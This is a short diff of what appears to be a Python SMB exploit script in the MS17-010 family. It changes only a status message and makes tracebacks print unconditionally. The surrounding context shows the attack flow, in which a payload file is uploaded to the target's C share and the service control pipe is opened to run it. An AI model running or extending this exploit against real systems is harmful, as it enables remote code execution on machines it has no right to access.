@@ -1160,7 +1160,7 @@ def do_system_mysmb_session(conn, pipe_name, share, mode, payload_file):
 
     # example of sending a file to the remote host
     smbConn = conn.get_smbconnection()
-    print("Sending file to the the target...")
+    print("[*]Sending file to the the target...")
     smb_send_file(smbConn, payload_file, "C", f"/{payload_file}")
     scmr = conn.get_dce_rpc("svcctl")
     try:
@@ -1334,11 +1334,10 @@ def exploit(target, port, username, password, pipe_name, share, mode, payload_fi
         do_system_mysmb_session(conn, pipe_name, share, mode, payload_file)
     except Exception as e:
         print("[-] got exception")
-        if logging.getLogger().level == logging.DEBUG:
-            import traceback
+        import traceback
 
-            traceback.print_exc()
-        logging.critical(str(e))
+        traceback.print_exc()
+        print(e)
 
     # restore SecurityContext/Token
     if "PCTXTHANDLE_TOKEN_OFFSET" in info:
